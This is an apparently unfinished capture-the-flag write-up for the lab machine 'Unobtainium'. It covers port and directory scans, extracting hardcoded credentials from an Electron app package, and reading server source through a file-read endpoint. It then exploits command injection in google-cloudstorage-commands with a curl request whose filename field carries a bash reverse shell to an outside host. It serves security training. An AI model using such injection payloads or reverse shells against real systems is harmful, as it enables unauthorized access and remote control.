## ------------------->> Unobtainium <<-------------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.235 -p-
---------

    Nmap scan report for 10.10.10.235
    Host is up (0.22s latency).
    Not shown: 65526 closed ports
    PORT      STATE SERVICE          VERSION
    22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)
    |   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)
    |_  256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)
    80/tcp    open  http             Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Unobtainium
    2379/tcp  open  ssl/etcd-client?
    | ssl-cert: Subject: commonName=unobtainium
    | Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
    | Not valid before: 2021-01-17T07:10:30
    |_Not valid after:  2022-01-17T07:10:30
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |_  h2
    | tls-nextprotoneg: 
    |_  h2
    2380/tcp  open  ssl/etcd-server?
    | ssl-cert: Subject: commonName=unobtainium
    | Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
    | Not valid before: 2021-01-17T07:10:30
    |_Not valid after:  2022-01-17T07:10:30
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |_  h2
    | tls-nextprotoneg: 
    |_  h2
    8443/tcp  open  ssl/https-alt
    | fingerprint-strings: 
    |   FourOhFourRequest: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
    |     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
    |     Date: Fri, 03 Sep 2021 10:43:05 GMT
    |     Content-Length: 212
    |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
    |   GenericLines: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
    |     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
    |     Date: Fri, 03 Sep 2021 10:43:03 GMT
    |     Content-Length: 185
    |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
    |   HTTPOptions: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
    |     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
    |     Date: Fri, 03 Sep 2021 10:43:04 GMT
    |     Content-Length: 189
    |_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
    |_http-title: Site doesn't have a title (application/json).
    | ssl-cert: Subject: commonName=minikube/organizationName=system:masters
    | Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
    | Not valid before: 2021-07-25T14:52:45
    |_Not valid after:  2022-07-26T14:52:45
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |   h2
    |_  http/1.1
    10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
    10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
    | ssl-cert: Subject: commonName=unobtainium@1610865428
    | Subject Alternative Name: DNS:unobtainium
    | Not valid before: 2021-01-17T05:37:08
    |_Not valid after:  2022-01-17T05:37:08
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |   h2
    |_  http/1.1
    10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
    31337/tcp open  http             Node.js Express framework
    | http-methods: 
    |_  Potentially risky methods: PUT DELETE
    |_http-title: Site doesn't have a title (application/json; charset=utf-8).


// Navigatin to http://10.10.10.235/ present us with 'chat application' website with 3 files for download

![Image 1]()

// Lets search for interesting directories or files on the website with [dirseach](https://github.com/maurosoria/dirsearch) tool(By maurosoria).

    $ python3 dirsearch.py -u http://10.10.10.235/ -t 100 -w /usr/share/dirb/wordlists/big.txt 
--------

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 20469

    Target: http://10.10.10.235/

    [06:51:48] Starting: 
    [06:51:53] 301 -  313B  - /assets  ->  http://10.10.10.235/assets/
    [06:51:58] 301 -  316B  - /downloads  ->  http://10.10.10.235/downloads/
    [06:52:02] 301 -  313B  - /images  ->  http://10.10.10.235/images/
    [06:52:12] 403 -  277B  - /server-status

// Didnt found much... so lets investigate the download files

// I will start with 'unobtainium_1.0.0_amd64.deb'

// We can extract the archieve files with ['ar'](https://www.computerhope.com/unix/uar.htm) command

    $ ar vx unobtainium_1.0.0_amd64.deb
---------

    x - debian-binary
    x - control.tar.gz
    x - data.tar.xz

// We see 3 files, first lets check the files from 'control.tar.gz'

    $ tar xfvz control.tar.gz 
------

    ./
    ./postinst
    ./postrm
    ./control
    ./md5sums

// Now we can see the 'control' file contant

    $ cat control
------

    Package: unobtainium
    Version: 1.0.0
    License: ISC
    Vendor: felamos <felamos@unobtainium.htb>
    Architecture: amd64
    Maintainer: felamos <felamos@unobtainium.htb>
    Installed-Size: 185617
    Depends: libgtk-3-0, libnotify4, libnss3, libxss1, libxtst6, xdg-utils, libatspi2.0-0, libuuid1, libappindicator3-1, libsecret-1-0
    Section: default
    Priority: extra
    Homepage: http://unobtainium.htb
    Description: 
      client

// There is potential email 'felamos@unobtainium.htb' and the domain 'http://unobtainium.htb' , Lets move on...

// Also we got 'data.tar.xz' file, its compressed .tar archieve, first we need to decompress the archieve

    $ xz --decompress data.tar.xz 

// Now we can extract files from the new decompressed 'data.tar'

    $ tar -xvf data.tar 
------

    ./
    ./usr/
    ./usr/share/
    ./usr/share/icons/
    ...
    ./opt/unobtainium/unobtainium       
    ...

// Check the 'unobtainium' file we can see its a elf file (executable).

    $ file unobtainium 

    unobtainium: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=eba93a10160aedf096f5289e37ab5d3fcdff1bcf, not stripped

// When try to execute that app, i get an error that 'unobtainium.htb' unreachable.

![Image 2]()

// So lets add unobtainium.htb to /etc/hosts

    $ cat /etc/hosts

    # Host addresses
    10.10.10.235 unobtainium.htb

// Running the app again didnt shows an error and there is a todo section

![Image 3]()

    {"ok":true,"content":
    "1. Create administrator zone.
    2. Update node JS API Server.
    3. Add Login functionality.
    4. Complete Get Messages feature.
    5. Complete ToDo feature.
    6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1
    7. Improve security"}

// Since the application working fine we can [configure variable envoronment](https://www.phoenixnap.com/kb/linux-set-environment-variable) to BurpSuite for intersept the communication

    $ set env variable http_proxy=127.0.0.1:8080

// It didnt work for me... so we remove the variable and move on....

    $ unset http_proxy

// When searching the directory of the app, there is another directory called 'resources' and there is a .asar file called 'app.asar'

    /opt/unobtainium/resources $ ls

    app.asar

// Found a [tool](https://github.com/electron/asar)(By MarshallOfSound) to extract files from .asar files.

// But it didnt really work to me.... 

// We could also use another way to search strings that contain the word 'password'

    $ strings app.asar | grep "password"
-----

        data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"text": message}}),

// Or we could also sniff the network packets with wireshark when opening the 'unobtainium' app

![Image 4]()

//  It's seems like Todo function has the capability to read files from the server. 

// Now that we have credentials , we can try to connect with SSH to the machine , but it didnt worked

// So, i open BurpSuite and play with request in the repeater till i send a request with filename empty

// And get ERROR response

![Image 5]()

// We could also get that response with 'curl'

    $ curl -X POST --data '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : ""}' -H "Content-Type: application/json" http://unobtainium.htb:31337/todo 
------

    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="utf-8">
    <title>Error</title>
    </head>
    <body>
    <pre>Error: ENOENT: no such file or directory, open<br> 
    &nbsp; &nbsp;at Object.openSync (fs.js:476:3)<br> 
    &nbsp; &nbsp;at Object.readFileSync (fs.js:377:35)<br> 
    &nbsp; &nbsp;at /usr/src/app/index.js:86:41<br> 
    &nbsp; &nbsp;at Array.forEach (&lt;anonymous&gt;)<br> 
    &nbsp; &nbsp;at /usr/src/app/index.js:84:36<br> 
    &nbsp; &nbsp;at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)<br> 
    &nbsp; &nbsp;at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13)<br> 
    &nbsp; &nbsp;at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3)<br> 
    &nbsp; &nbsp;at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)<br> 
    &nbsp; &nbsp;at /usr/src/app/node_modules/express/lib/router/index.js:281:22</pre>
    </body>
    </html>

// We can see there file called 'index.js' lets try to see his content.

![Image 6]()

// But its in bad format , i orginizeit a little bit

    {"ok":true,"content":"var root = require(\"google-cloudstorage-commands\");
    const express = require('express');
    const { exec } = require(\"child_process\");   
    const bodyParser = require('body-parser');
    const _ = require('lodash');
    const app = express();
    var fs = require('fs');
    const users = [
    {name: 'felamos', password: 'Winter2021'},\n  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},
    ];

    let messages = [];
    let lastId = 1; 
    function findUser(auth) {
    return users.find((u) => 
    u.name === auth.name &&
    u.password === auth.password);
    }   

    app.use(bodyParser.json());

    app.get('/', (req, res) => {
    res.send(messages);
    }); 

    app.put('/', (req, res) => { 
    const user = findUser(req.body.auth || {}); 

    if (!user) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
    }

    const message = {
    icon: '__',
    };

    _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
    });

    messages.push(message);
    res.send({ok: true});
    });

    app.delete('/', (req, res) => {
    const user = findUser(req.body.auth || {});

    if (!user || !user.canDelete) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
    }

    messages = messages.filter((m) => m.id !== req.body.messageId);
    res.send({ok: true});
    });
    app.post('/upload', (req, res) => {
    const user = findUser(req.body.auth || {});
    if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
    }

    filename = req.body.filename;
    root.upload(\"./\",filename, true);
    res.send({ok: true, Uploaded_File: filename});
    });

    app.post('/todo', (req, res) => {
    const user = findUser(req.body.auth || {});
    if (!user) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
    }

    filename = req.body.filename;
    testFolder = \"/usr/src/app\";
    fs.readdirSync(testFolder).forEach(file => {
    if (file.indexOf(filename) > -1) {
    var buffer = fs.readFileSync(filename).toString();
    res.send({ok: true, content: buffer});
    }
    });
    });

    app.listen(3000);
    console.log('Listening on port 3000...');
    "}

// Most interesting thing in that file its the first line

    {"ok":true,"content":"var root = require(\"google-cloudstorage-commands\");

// Searching for 'google-cloudstorage-commands' vulnerabilities, i found a vulnerablility for [Command Injection](https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431).

PoC:

    var root = require("google-cloudstorage-commands");
    root.upload("./","& touch JHU", true);

// In our case we need to manipulate the "filename"

    root.upload("./",filename, true);

// 


$curl -H "Content-Type: application/json" -X POST http://unobtainium.htb:31337/upload --data '{"auth": {"name": "felamos", "password": "Winter2021"},"filename":"$(/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.3/1444 0>&1')"}





    $ python3 dirsearch.py -u https://10.10.10.235:8443/ -t 100 -w /usr/share/dirb/wordlists/big.txt 
---------

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 20469

    Output File: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/reports/10.10.10.235/_21-09-03_06-52-29.txt

    Error Log: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/logs/errors-21-09-03_06-52-29.log

    Target: https://10.10.10.235:8443/

    [06:52:30] Starting: 
    [06:53:28] 200 -  263B  - /version


//

    $ python3 dirsearch.py -u https://10.10.10.235:10250/ -t 100 -w /usr/share/dirb/wordlists/big.txt 
------------

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 20469

    Output File: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/reports/10.10.10.235/_21-09-03_07-08-09.txt

    Error Log: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/logs/errors-21-09-03_07-08-09.log

    Target: https://10.10.10.235:10250/

    [07:08:09] Starting: 
    [07:08:15] 401 -   12B  - /attach
    [07:08:22] 401 -   12B  - /exec
    [07:08:29] 301 -   41B  - /logs  ->  /logs/
    [07:08:30] 401 -   12B  - /metrics
    [07:08:33] 401 -   12B  - /pods
    [07:08:36] 401 -   12B  - /run
    [07:08:38] 301 -   42B  - /stats  ->  /stats/

    Task Completed

//

    $ python3 dirsearch.py -u http://10.10.10.235:10249/ -t 100 -w /usr/share/dirb/wordlists/big.txt 
---------

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 20469

    Output File: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/reports/10.10.10.235/_21-09-03_07-09-46.txt

    Error Log: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/logs/errors-21-09-03_07-09-46.log

    Target: http://10.10.10.235:10249/

    [07:09:47] Starting: 
    [07:10:05] 200 -   27KB - /metrics


// 




// https://10.10.10.235:8443/version


{
  "major": "1",
  "minor": "20",
  "gitVersion": "v1.20.0",
  "gitCommit": "af46c47ce925f4c4ad5cc8d1fca46c7b77d13b38",
  "gitTreeState": "clean",
  "buildDate": "2020-12-08T17:51:19Z",
  "goVersion": "go1.15.5",
  "compiler": "gc",
  "platform": "linux/amd64"
}



// http://10.10.10.235:31337/

[{"icon":"__","id":1,"timestamp":1630666833826,"userName":"felamos"},{"icon":"__","id":2,"timestamp":1630666879163,"userName":"felamos"}]



